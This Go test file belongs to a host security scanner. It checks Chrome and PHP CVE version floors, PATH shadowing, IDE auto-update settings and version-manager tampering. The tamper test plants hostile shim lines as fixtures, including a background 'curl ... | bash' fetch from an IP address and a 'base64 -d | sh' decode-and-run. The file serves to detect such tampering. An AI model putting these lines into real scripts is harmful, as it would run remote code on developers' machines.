package hostsec

import (
	"compress/gzip"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/Sanilas-ai/toolchain-verify/internal/findings"
)

func TestChromeFloor(t *testing.T) {
	tr := newTree(t)
	tr.write("/var/lib/dpkg/status", pkg("google-chrome-stable", "157.0.8103.49-1", "amd64")+pkg("chromium-browser", "2:1snap1-0ubuntu2", "amd64")+pkg("chromium", "157.0.8103.50-1~deb12u1", "amd64"))
	tr.write("/snap/chromium/current/meta/snap.yaml", "name: chromium\nversion: 156.0.7999.120\n")
	rep := run(t, tr, nil, Options{Apps: true})
	one(t, rep, "host.chrome-cve-2026-125350", findings.SevFail, "157.0.8103.49 < 157.0.8103.50")
	one(t, rep, "host.chrome-cve-2026-125350", findings.SevFail, "156.0.7999.120")
	if n := len(find(rep, "host.chrome-cve-2026-125350")); n != 2 {
		t.Fatalf("want 2 chrome findings:\n%s", dump(rep))
	}
	rep = run(t, tr, nil, Options{Apps: true, ChromeVersion: []byte("Google Chrome 157.0.8103.51 \n")})
	none(t, rep, "host.chrome-cve-2026-125350")
	rep = run(t, tr, nil, Options{Apps: true, ChromeVersion: []byte("Chromium 157.0.8102.99 snap\n")})
	if f := one(t, rep, "host.chrome-cve-2026-125350", findings.SevFail, "157.0.8102.99"); f.Path != "google-chrome --version" {
		t.Errorf("path = %q", f.Path)
	}
}

func TestPHPFloor(t *testing.T) {
	for _, c := range []struct {
		v    string
		vuln bool
	}{{"8.3.35", true}, {"8.3.36", false}, {"8.2.34", true}, {"8.2.35", false}, {"8.4.26", true}, {"8.4.27", false},
		{"8.5.11", true}, {"8.5.12", false}, {"8.1.99", true}, {"7.4.33", true}, {"8.6.0", false}} {
		m := phpVerRe.FindStringSubmatch(c.v)
		maj, min, patch := atoi(m[1]), atoi(m[2]), atoi(m[3])
		if got := PHPVulnerable109618(maj, min, patch); got != c.vuln {
			t.Errorf("PHP %s vulnerable=%v, want %v", c.v, got, c.vuln)
		}
	}
	tr := newTree(t)
	tr.write("/var/lib/dpkg/status", pkg("php8.3-cli", "8.3.30-1+ubuntu24.04.1+deb.sury.org+1", "amd64")+pkg("php8.3-common", "8.3.30-1+ubuntu24.04.1+deb.sury.org+1", "amd64")+
		pkg("php8.1-fpm", "8.1.2-1ubuntu2.22", "amd64")+pkg("php8.4-cli", "8.4.27-1", "amd64")+pkg("php-common", "2:93", "all"))
	gzWrite(t, tr, "/usr/share/doc/php8.1-fpm/changelog.Debian.gz", "php8.1 (8.1.2-1ubuntu2.22) jammy-security; urgency=medium\n  * SECURITY UPDATE: RCE\n    - CVE-2026-109618\n")
	rep := run(t, tr, nil, Options{Apps: true})
	one(t, rep, "host.php-cve-2026-109618", findings.SevFail, "PHP 8.3.30 < 8.3.36")
	one(t, rep, "host.php-cve-2026-109618", findings.SevInfo, "backport")
	if n := len(find(rep, "host.php-cve-2026-109618")); n != 2 {
		t.Fatalf("want 2 php findings (8.3 once, 8.1 backport):\n%s", dump(rep))
	}
	rep = run(t, newTree(t), nil, Options{Apps: true, PHPVersion: []byte("PHP 8.0.30 (cli) (built: Sep  1 2024)\n")})
	one(t, rep, "host.php-cve-2026-109618", findings.SevFail, "end of life")
}

func atoi(s string) int { n, _ := strconv.Atoi(s); return n }

func gzWrite(t *testing.T, tr *tree, p, content string) {
	t.Helper()
	full := tr.write(p, "")
	f, err := os.Create(full)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	zw := gzip.NewWriter(f)
	zw.Write([]byte(content))
	zw.Close()
}

func TestPathOrder(t *testing.T) {
	tr := newTree(t)
	tr.write("/usr/bin/sudo", "")
	tr.write("/usr/bin/python3", "")
	tr.write("/usr/bin/ls", "")
	tr.write("/home/dev/.pyenv/shims/python3", "")
	tr.write("/tmp/evil/sudo", "")
	tr.write("/home/dev/after/ls", "")
	for _, d := range []string{"/home/dev/.pyenv/shims", "/tmp/evil", "/home/dev/after"} {
		os.Chmod(filepath.Join(tr.root, d), 0o777) // user-writable even when tests run as root
	}
	pathEnv := "/home/dev/.pyenv/shims:/tmp/evil:/missing:/usr/bin:/bin:/home/dev/after"
	rep := run(t, tr, nil, Options{Apps: true, PathEnv: pathEnv})
	ws := find(rep, "host.path-user-writable")
	if len(ws) != 2 {
		t.Fatalf("want 2 user-writable entries ahead of /usr/bin:\n%s", dump(rep))
	}
	one(t, rep, "host.path-shadow", findings.SevFail, "sudo")
	one(t, rep, "host.path-shadow", findings.SevInfo, "python3")
	for _, f := range rep.Findings {
		if strings.Contains(f.Path, "/home/dev/after") {
			t.Errorf("entry after system dirs flagged: %+v", f)
		}
	}
	rep = run(t, tr, nil, Options{Apps: true, PathEnv: "/usr/bin::/bin"})
	none(t, rep, "host.path-user-writable") // "::" after /usr/bin is ignored: only entries ahead matter
	rep = run(t, tr, nil, Options{Apps: true, PathEnv: ".:/usr/bin"})
	one(t, rep, "host.path-user-writable", findings.SevFail, "current directory")
}

const pyenvDispatcher = "#!/usr/bin/env bash\nset -e\nif [ -n \"$PYENV_DEBUG\" ]; then set -x; fi\nexec \"pyenv-$command\" \"$@\"\n"

func TestVersionManagerTamper(t *testing.T) {
	tr := newTree(t)
	// Clean installs.
	tr.write("/home/dev/.pyenv/libexec/pyenv", pyenvDispatcher)
	tr.write("/home/dev/.pyenv/shims/python", "#!/usr/bin/env bash\nset -e\nexport PYENV_ROOT=\"/home/dev/.pyenv\"\nexec \"/home/dev/.pyenv/libexec/pyenv\" exec \"$program\" \"$@\"\n")
	tr.write("/home/linuxbrew/.linuxbrew/Cellar/rbenv/1.3.2/libexec/rbenv", "#!/usr/bin/env bash\nexec rbenv-$1\n")
	tr.write("/home/linuxbrew/.linuxbrew/Cellar/rbenv/1.3.2/INSTALL_RECEIPT.json", "{}")
	tr.symlink("/home/linuxbrew/.linuxbrew/bin/rbenv", "../Cellar/rbenv/1.3.2/bin/rbenv")
	tr.symlink("/home/linuxbrew/.linuxbrew/bin/brew", "../Homebrew/bin/brew")
	rep := run(t, tr, nil, Options{Apps: true})
	none(t, rep, "host.version-manager-tamper")

	// Binance-style: Homebrew pyenv replaced, link re-pointed, shim tampered.
	tr.write("/opt/homebrew/Cellar/pyenv/2.8.0/libexec/pyenv", pyenvDispatcher+"(curl -fsSL https://198.51.100.7/p | bash) >/dev/null 2>&1 &\n")
	tr.write("/opt/homebrew/Cellar/pyenv/2.8.0/INSTALL_RECEIPT.json", "{}")
	tr.age("/opt/homebrew/Cellar/pyenv/2.8.0/INSTALL_RECEIPT.json", 30*24*time.Hour)
	tr.symlink("/opt/homebrew/bin/pyenv", "/tmp/.cache/pyenv")
	tr.write("/home/dev/.pyenv/shims/pip", "#!/usr/bin/env bash\necho ZWNobyBoaQ== | base64 -d | sh\n")
	tr.symlink("/usr/local/bin/brew", "/tmp/brew")
	rep = run(t, tr, nil, Options{Apps: true})
	one(t, rep, "host.version-manager-tamper", findings.SevFail, `Homebrew pyenv dispatcher contains "curl"`)
	one(t, rep, "host.version-manager-tamper", findings.SevWarn, "modified")
	one(t, rep, "host.version-manager-tamper", findings.SevFail, `outside Cellar/pyenv/`)
	one(t, rep, "host.version-manager-tamper", findings.SevFail, `pyenv shim contains "base64 -d"`)
	one(t, rep, "host.version-manager-tamper", findings.SevFail, `brew link points to "/tmp/brew"`)
}

func TestExtensionAutoUpdate(t *testing.T) {
	tr := newTree(t)
	tr.write("/home/dev/.config/Code/User/settings.json", "{\n  \"editor.fontSize\": 13\n}\n")
	tr.write("/home/dev/.config/Cursor/User/settings.json", "{\n  // pinned\n  \"extensions.autoUpdate\": false\n}\n")
	tr.write("/home/dev/.config/Windsurf/User/keybindings.json", "[]")
	rep := run(t, tr, nil, Options{Apps: true})
	ws := find(rep, "host.ide-extension-autoupdate")
	if len(ws) != 2 || !strings.HasPrefix(ws[0].Message, "Code:") || !strings.HasPrefix(ws[1].Message, "Windsurf:") {
		t.Fatalf("want Code and Windsurf (no settings.json), not Cursor:\n%s", dump(rep))
	}
}
